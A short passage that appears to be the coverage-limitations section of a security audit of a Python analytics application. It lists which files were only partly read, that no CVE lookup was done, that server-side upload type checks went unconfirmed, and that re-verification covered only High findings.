- **No CVE lookup** for the lock-file versions (many are newer than the auditors' knowledge); abandoned packages noted only by reputation (`ldap3`, `toml`).
- Partly or not read: `workforce_analysis.py` 1–184 and 484–649, `equity.py` 620+, `financial_analysis.py` 410+, `cohort_analysis.py` 420+, parts of `curve_fit.py`, `change_analysis.py`, `ml_evaluate.py`, `chart_designer.design_from_reply`, the dashboard chart builders, `scripts/` (infra auditor read them), the seccomp profile against a live container, and the vendored Vega version's advisories.
- Several auditors only grepped `docs/IMPROVEMENTS.md` (2,336 lines); an item may be documented there that is labelled new here.
- Whether Streamlit enforces the uploader `type=` list server-side was not confirmed (affects H-3's severity).
- Lead re-verification covered the High findings only; Medium/Low items carry the auditors' TRACED labels.
